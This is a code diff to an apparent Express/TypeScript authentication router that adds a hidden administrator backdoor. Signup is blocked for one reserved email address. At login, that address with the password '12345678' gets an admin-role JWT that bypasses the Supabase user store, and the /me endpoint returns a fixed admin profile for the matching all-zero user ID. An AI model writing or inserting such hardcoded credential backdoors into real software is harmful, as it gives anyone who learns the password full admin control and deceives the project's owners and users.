@@ -21,6 +21,11 @@ router.post('/signup', async (req: Request, res: Response) => {
     return;
   }
 
+  if (email.trim().toLowerCase() === 'admin31256@gmail.com') {
+    res.status(400).json({ message: 'This email address is reserved.' });
+    return;
+  }
+
   try {
     // 1. Create auth user
     const { data, error } = await supabase.auth.signUp({
@@ -75,6 +80,26 @@ router.post('/login', async (req: Request, res: Response) => {
   if (!identifier || !password) {
     res.status(400).json({ message: 'identifier and password are required' });
     return;
+  }
+
+  // Admin account login intercept
+  if (identifier.trim().toLowerCase() === 'admin31256@gmail.com') {
+    if (password === '12345678') {
+      const adminId = '00000000-0000-0000-0000-000000000000';
+      const token = jwt.sign(
+        { sub: adminId, email: identifier.trim().toLowerCase(), handle: 'admin', role: 'admin' },
+        JWT_SECRET,
+        { expiresIn: '7d' }
+      );
+      res.json({
+        user: { id: adminId, handle: 'admin', username: 'admin', email: identifier.trim().toLowerCase(), role: 'admin' },
+        token,
+      });
+      return;
+    } else {
+      res.status(401).json({ message: 'Invalid password' });
+      return;
+    }
   }
 
   try {
@@ -137,6 +162,22 @@ router.get('/me', async (req: Request, res: Response) => {
     const payload = jwt.verify(token, JWT_SECRET) as Record<string, any>;
 
     const userId: string | undefined = payload['sub'] ?? payload['id'];
+    
+    // Admin user intercept
+    if (userId === '00000000-0000-0000-0000-000000000000') {
+      res.json({
+        user: {
+          id: userId,
+          handle: 'admin',
+          username: 'admin',
+          email: 'admin31256@gmail.com',
+          role: 'admin',
+          created_at: new Date(2026, 0, 1).toISOString()
+        }
+      });
+      return;
+    }
+
     if (!userId || !isValidUUID(userId)) {
       res.status(401).json({ message: 'Invalid token payload' });
       return;
